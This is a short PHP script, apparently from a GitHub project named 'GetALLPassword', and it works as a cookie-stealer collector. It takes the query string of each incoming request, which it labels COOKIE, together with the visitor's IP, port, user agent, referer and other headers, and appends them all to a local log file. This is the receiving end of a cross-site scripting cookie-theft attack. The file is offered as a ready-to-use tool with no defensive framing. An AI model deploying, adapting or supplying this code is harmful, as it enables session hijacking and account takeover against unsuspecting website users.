<?php 
//BY MAHDI ALBADRY
//https://github.com/MAHDI-ALBADRY/GetALLPassword
function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "desconocido")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "desconocido")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "desconocido")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "desconocido")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "desconocido"; 
	return($ip); 
} 

//BY MAHDI ALBADRY
//https://github.com/MAHDI-ALBADRY/GetALLPassword

function logData() 
{ 
	$ipLog="Data By AnwerSenan.txt"; 
	$cookie = $_SERVER['QUERY_STRING']; 
	$register_globals = (bool) ini_get('register_gobals'); 
	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 
	//BY MAHDI ALBADRY
    //https://github.com/MAHDI-ALBADRY/GetALLPassword
	$lenguaje_xd = $_SERVER['HTTP_ACCEPT_LANGUAGE']; 
	$procolo_xd = $_SERVER['SERVER_PROTOCOL']; 
	$proxy_xd = $_SERVER['HTTP_X_FORWARDED_FOR']; 
	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
	$rqst_method = $_SERVER['METHOD']; 
	$rem_host = $_SERVER['REMOTE_HOST']; 
	$referer = $_SERVER['HTTP_REFERER']; 
	$date=date ("l dS of F Y h:i:s A");  
	$log=fopen("$ipLog", "a+"); 

	if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
		fputs($log, "IP: $ip | Proxy:$proxy_xd | PORT: $rem_port | Protocolo: $procolo_xd | Host: $rem_host | Lenguaje: $lenguaje_xd | Agente: $user_agent | Metodo get/post: $rqst_method | REF: $referer | Fecha{ : } $date | COOKIE:  $cookie <br>"); 
	else 
		fputs($log, "IP: $ip | Proxy:$proxy_xd | PORT: $rem_port | Protocolo: $procolo_xd | Host: $rem_host | Lenguaje: $lenguaje_xd | Agente: $user_agent | Metodo get/post: $rqst_method | REF: $referer |  Fecha: $date | COOKIE:  $cookie \n\n"); 
	fclose($log); 
} 

logData(); 
//BY MAHDI ALBADRY
//https://github.com/MAHDI-ALBADRY/GetALLPassword
?>
